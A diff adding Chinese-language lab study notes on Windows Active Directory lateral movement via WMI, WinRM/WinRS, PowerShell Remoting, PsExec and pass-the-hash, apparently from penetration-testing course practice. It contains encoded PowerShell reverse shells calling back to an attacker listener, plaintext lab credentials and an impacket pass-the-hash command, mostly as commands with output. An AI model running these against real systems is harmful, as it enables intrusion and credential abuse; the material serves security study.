@@ -112,3 +112,200 @@ print(cmd)
 └─$ python3 WMI_reverseshell.py 
 powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABi
 ```
+>產生 payload
+##### 3.2 透過 WMI 在遠端機器執行 reverse shell
+與上述 calc.exe 一樣的步驟，只是將 command 改成 base64 encode 的 reverse shell
+```
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.144.73 -Credential $credential -SessionOption $Options
+PS C:\Users\jeff> $Command='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+PS C:\Users\jeff> $Command='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+ProcessId ReturnValue PSComputerName
+--------- ----------- --------------
+     4708           0 192.168.144.73
+
+PS C:\Users\jeff>
+
+```
+(Kali 監聽 8888 port)
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+
+    
+connect to [192.168.45.159] from (UNKNOWN) [192.168.144.73] 61659
+PS C:\Windows\system32> hostname
+FILES04
+PS C:\Windows\system32> whoami
+corp\jen
+```
+
+#### 使用 WinRM 進行橫向移動
+除了 WMI 之外，也可以利用 WinRM（Windows Remote Management） 來達成相同的效果。\
+WinRM 可用於遠端主機管理。 WinRM 是 [WS-Management](https://en.wikipedia.org/wiki/WS-Management) 協定的 Microsoft 版本 ，透過 HTTP 和 HTTPS 交換 XML 資訊。使用 TCP `5986` port 進行加密 HTTPS 流量，使用 `5985` port 進行純 HTTP 流量。
+#### 1. 透過 WinRS 遠端執行命令
+WinRS 是 WinRM 的 CLI 工具
+```
+C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+FILES04
+corp\jen
+```
+#### 2. 透過 WinRS 執行 Reverse shell
+將 command 改成 reverse shell payload
+```
+PS C:\Users\jeff> winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+#< CLIXML
+```
+(Kali)
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.159] from (UNKNOWN) [192.168.144.73] 61661
+
+PS C:\Users\jen> hostname
+FILES04
+PS C:\Users\jen> whoami
+corp\jen
+PS C:\Users\jen> 
+
+```
+#### 3. 透過 PowerShell Remoting 建立 WinRM session
+```
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+PS C:\Users\jeff> New-PSSession -ComputerName 192.168.144.73 -Credential $credential
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          192.168.144.73  RemoteMachine   Opened        Microsoft.PowerShell     Available
+
+PS C:\Users\jeff> Enter-PSSession 1
+[192.168.144.73]: PS C:\Users\jen\Documents> whoami
+corp\jen
+[192.168.144.73]: PS C:\Users\jen\Documents> hostname
+FILES04
+```
+> 建立一個遠端會話，Session ID 為 1\
+`State = Opened`：表示 session 處於開啟狀態，可以直接交互\
+`Enter-PSSession 1` 直接進入遠端 PowerShell session，這樣可以直接在 192.168.144.73 上執行命令
+
+### PsExec
+PsExec 是 [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite 中的一個強大工具。\
+主要用途是提供 Remote Execution，類似於 Telnet，但不需要手動開啟遠端桌面或 SSH 連線。可以 遠端執行命令，並且提供 interactive shell。
+透過 ADMIN$ share（Windows 內建的管理共享）來傳輸執行檔案。
+
+>[!Note]
+>如何透過 PsExec 進行橫向移動，需要滿足三個條件：
+>1. 擁有管理員（Administrator）權限：
+連線的帳戶（如 corp\jen）必須是目標機器的 Local Administrator。
+>2. ADMIN$ 共享必須開啟：
+ADMIN$ share 是一個內建的 Windows 網路管理共享，用於遠端管理 Windows 系統。\
+(預設情況下，Windows 伺服器會啟用 ADMIN$，因此通常可用)
+>3. 文件與印表機共享（File and Printer Sharing）必須開啟：
+這允許 PsExec 透過 SMB 協議與目標機器通訊。\
+(預設情況下，Windows 伺服器會啟用這項功能)
+
+當執行 PsExec 遠端執行命令時，會將 `psexesvc.exe`（PsExec 服務程式）寫入遠端目標的 `C:\Windows\` 目錄。在遠端機器上建立並啟動一個 Windows 服務。讓該服務以 `psexesvc.exe` 為 parent process，執行攻擊者提供的命令。
+
+[環境範例]\
+假設我們已經成功獲取 FILES04 上 jen 的 明文密碼，並且擁有 CLIENT74 的 RDP 存取權。
+此時，我們可以利用 CLIENT74 來使用 PsExec，並遠端連接 FILES04。
+#### 1. 登入 RDP
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.144.74cd \To    
+```
+#### 2. 使用 PsExec 遠端執行指令
+SysInternals suit 已經安裝在 `C:\Tools\SysinternalsSuite`
+```
+PS C:\Tools> cd .\SysinternalsSuite\
+PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname
+FILES04
+
+C:\Windows\system32>whoami
+corp\jen
+```
+>`-i`：使用 Interactive Mode\
+`\\FILES04`：指定目標機器（遠端 Windows 伺服器）\
+`-u corp\jen`：使用者帳戶（是 FILES04 的管理員）\
+`-p Nexus123!`：密碼（jen 帳戶的明文密碼）\
+`cmd`：執行的程式（這裡是 Windows 命令提示字元）
+
+>[!Important]
+>PsExec 比較 WMI & WinRM
+>![image](https://hackmd.io/_uploads/ryWbUH1nJl.png)
+
+### Pass the Hash
+直接利用 NTLM hash 進行身份驗證並達成 Lateral Movement\
+>[!Tip]
+>只適用於使用 NTLM 驗證的伺服器或服務，不適用於使用 Kerberos 驗證的伺服器或服務
+
+PtH 屬於 MITRE Framework 中的 "[Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)"
+
+>[!Important]
+>**PtH 工具**:
+>- Metasploit 的 [PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
+>- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+>- [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)（常用於紅隊測試）
+>
+> 工具的基本原理類似，使用 SMB（TCP 445） 連接目標系統，然後利用 NTLM Hash 來驗證身份
+
+>[!Note]
+>Pass the Hash（PtH）需要滿足三個條件:
+>1. 目標機器的 SMB（TCP 445）必須開啟（允許網路存取）。
+>2. Windows 必須啟用「文件與印表機共享（File and Printer Sharing）」。
+>3. 目標機器的 ADMIN$ share 必須開啟（這是 Windows 內建的管理共享，預設開啟）。
+>
+>與 PsExec 類似，PtH 通常需要 Local Administrator 權限，因為只有管理員帳戶能夠存取 ADMIN$。
+
+[環境範例]\
+假設已經竊取了 FILES04 伺服器的本機管理員 NTLM Hash，可以直接使用這個 Hash 來驗證，而不需要破解密碼。
+#### 1. 使用 Impacket 的 wmiexec 進行 PtH
+在 Kali Linux 上執行 wmiexec 來存取 FILES04
+```
+┌──(chw㉿CHW)-[~]
+└─$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.144.73
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+FILES04
+
+C:\>whoami
+files04\administrator
+```
+> `/usr/bin/impacket-wmiexec`：Impacket 工具中的 wmiexec.py（用於遠端執行命令）\
+`-hashes :`：已經獲取的 NTLM Hash\
+`Administrator@192.168.144.73`：目標帳戶 Administrator 在 FILES04（IP 192.168.144.73）上執行
+
+[2014 年的 Windows 安全性更新](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a) 限制了 本機管理員帳戶的 PtH 使用，但仍然可以用於 Active Directory domain accounts。
+
+>[!Tip]
+>**PtH + Pivoting**
+如果目標機器 FILES04 在受限網路（無法直接存取），可以：\
+先滲透 CLIENT74，取得 FILES04 的 NTLM Hash\
+在 CLIENT74 上執行 PtH 攻擊 FILES04，透過 Pivoting（樞紐攻擊） 進一步擴展控制權限。
+
+### Overpass the Hash
